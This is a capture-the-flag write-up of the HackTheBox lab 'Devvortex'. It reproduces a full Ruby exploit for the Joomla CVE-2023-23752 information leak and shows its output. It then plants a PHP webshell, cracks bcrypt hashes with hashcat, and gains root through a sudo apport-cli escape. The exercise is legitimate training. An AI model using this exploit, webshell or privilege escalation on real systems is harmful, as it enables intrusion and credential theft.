---
title: Devvortex
tags:
  - HackTheBox
  - Easy
  - Linux
  - Joomla
  - Information-Disclosure
  - Brute-Forcing
  - Sudo-Vulnerability
  - Apport-cli
---
![](Pasted%20image%2020241119153117.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- analytical.htb > sC.txt

[redacted]
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: DevVortex
```

So I decided to take a look at the webpage:

![](Pasted%20image%2020241119153402.png)

I didn't find anything by inspecting the source code, so I decided to perform some vhost enumeration with [Ffuf 🐳](/notes/tools/ffuf.md):

```shell
ffuf -w ~/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -fs 154

[redacted]
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 102ms]
```

So I added it to my known hosts and checked the new domain:

![](Pasted%20image%2020241119153908.png)

If we check the `http://dev.devvortex.htb/robots.txt` we found the following:

```txt
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Inside `/administrator` I discovered a Joomla:

![](Pasted%20image%2020241119154224.png)

If we inspect inside `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` we can find its version:

![](Pasted%20image%2020241119154745.png)

## Weaponization

I searched in Google for "*Joomla 4.2.6 exploit*" and found [CVE-2023-23752](https://www.exploit-db.com/exploits/51334):
- [Available on Github](https://github.com/Acceis/exploit-CVE-2023-23752)

```ruby
#!/usr/bin/env ruby

# Exploit
## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
## Author website: https://pwn.by/noraj/
## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
## Date: 2023-03-24
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

# standard library
require 'json'
# gems
require 'httpx'
require 'docopt'
require 'paint'

doc = <<~DOCOPT
  #{Paint['Joomla! < 4.2.8 - Unauthenticated information disclosure', :bold]}

  #{Paint['Usage:', :red]}
    #{__FILE__} <url> [options]
    #{__FILE__} -h | --help

  #{Paint['Parameters:', :red]}
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  #{Paint['Options:', :red]}
    --debug     Display arguments
    --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
    -h, --help  Show this screen

  #{Paint['Examples:', :red]}
    #{__FILE__} http://127.0.0.1:4242
    #{__FILE__} https://example.org/subdir

  #{Paint['Project:', :red]}
    #{Paint['author', :underline]} (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
    #{Paint['company', :underline]} (https://www.acceis.fr / https://twitter.com/acceis)
    #{Paint['source', :underline]} (https://github.com/Acceis/exploit-CVE-2023-23752)
DOCOPT

def fetch_users(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/users?public=true"
  http.get(vuln_url)
end

def parse_users(root_url, http)
  data_json = fetch_users(root_url, http)
  data = JSON.parse(data_json)['data']
  users = []
  data.each do |user|
    if user['type'] == 'users'
      id = user['attributes']['id']
      name = user['attributes']['name']
      username = user['attributes']['username']
      email = user['attributes']['email']
      groups = user['attributes']['group_names']
      users << {id: id, name: name, username: username, email: email, groups: groups}
    end
  end
  users
end

def display_users(root_url, http)
  users = parse_users(root_url, http)
  puts Paint['Users', :red, :bold]
  users.each do |u|
    puts "[#{u[:id]}] #{u[:name]} (#{Paint[u[:username], :yellow]}) - #{u[:email]} - #{u[:groups]}"
  end
end

def fetch_config(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/config/application?public=true"
  http.get(vuln_url)
end

def parse_config(root_url, http)
  data_json = fetch_config(root_url, http)
  data = JSON.parse(data_json)['data']
  config = {}
  data.each do |entry|
    if entry['type'] == 'application'
      key = entry['attributes'].keys.first
      config[key] = entry['attributes'][key]
    end
  end
  config
end

def display_config(root_url, http)
  c = parse_config(root_url, http)
  puts Paint['Site info', :red, :bold]
  puts "Site name: #{c['sitename']}"
  puts "Editor: #{c['editor']}"
  puts "Captcha: #{c['captcha']}"
  puts "Access: #{c['access']}"
  puts "Debug status: #{c['debug']}"
  puts
  puts Paint['Database info', :red, :bold]
  puts "DB type: #{c['dbtype']}"
  puts "DB host: #{c['host']}"
  puts "DB user: #{Paint[c['user'], :yellow, :bold]}"
  puts "DB password: #{Paint[c['password'], :yellow, :bold]}"
  puts "DB name: #{c['db']}"
  puts "DB prefix: #{c['dbprefix']}"
  puts "DB encryption #{c['dbencryption']}"
end

begin
  args = Docopt.docopt(doc)
  Paint.mode = 0 if args['--no-color']
  puts args if args['--debug']

  http = HTTPX
  display_users(args['<url>'], http)
  puts
  display_config(args['<url>'], http)
rescue Docopt::Exit => e
  puts e.message
end
```

## Exploitation

- Check the [Joomla 🦁](/notes/CMS/Joomla.md) note

```shell
sudo ruby exploit.rb http://dev.devvortex.htb/api/index.php/v1/config/application?public=true

Users

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

> We've got credentials to access Joomla!: `lewis:P4ntherg0t1n5r3c0n##`

![](Pasted%20image%2020241119155957.png)

Now we can execute a reverse shell (also check [Joomla 🦁](/notes/CMS/Joomla.md) note)

Basically, you can edit a template and add a webshell on it:

```php
<?php system($_GET['cmd']); ?>
```

![](Pasted%20image%2020241119160552.png)

Now execute a curl request:

```shell
curl -s http://dev.devvortex.htb/administrator/templates/atum/error.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So you can now get a reverse shell (by changing the `error.php` content yo a php reverse shell -> check [Reverse shells 👾](/notes/reverse_shells.md)):

```shell
# Execute nc listener
# Then do a curl req
curl -s http://dev.devvortex.htb/administrator/templates/atum/error.php
```

> We've got a reverse shell :D

![](Pasted%20image%2020241119161459.png)

## Lateral movement

As I don't have permissions to read user flag, I performed some enumeration among the machine.

I noticed that port 33060 and 3306 were in use:

```shell
ss -tlpn

[redacted]
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*                                                                                       
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*        
```

This ports are used by mysql databases, so I searched inside `/var/` for its configuration, where I discovered `/var/www.dev.devvortex.htb/configuration.php`:

```shell
cat /var/www.dev.devvortex.htb/configuration.php

[redacted]
public $user = 'lewis';
public $password = 'P4ntherg0t1n5r3c0n##';
```

Casually the creds are the same as Joomla:

```sql
show databases;
use joomla;
show tables;
select username,password from sd4fg_users;

+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

So now we can try to crack logan creds :D using Hashcat. Seems to be bcrypt:
- Check [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md)

```shell
# First save the hash in a file (hashes.txt)
hashcat -m 3200 -a 0 -o cracked.txt hashes.txt ~/wordlists/rockyou.txt

# cat cracked.txt
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

> We've got logan creds: `logan:tequieromucho`, and can read user flag :D

![](Pasted%20image%2020241119163632.png)

## Privilege Escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

I ran the help of the program and saw that it was kinda "crash report program". I searched in Google for "*apport cli privilege escalation*" and found [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC).

Before executing it, I need to trigger a crash report of any process, so I executed the following:

```shell
ps -ef
# Select a random PID -> 898 in my case
sudo /usr/bin/apport-cli -f -P 898
# Then select V
# Then type /bin/bash
```

![](Pasted%20image%2020241119165027.png)

> Now I can read root flag :D

![](Pasted%20image%2020241119165119.png)

==Machine pwned!==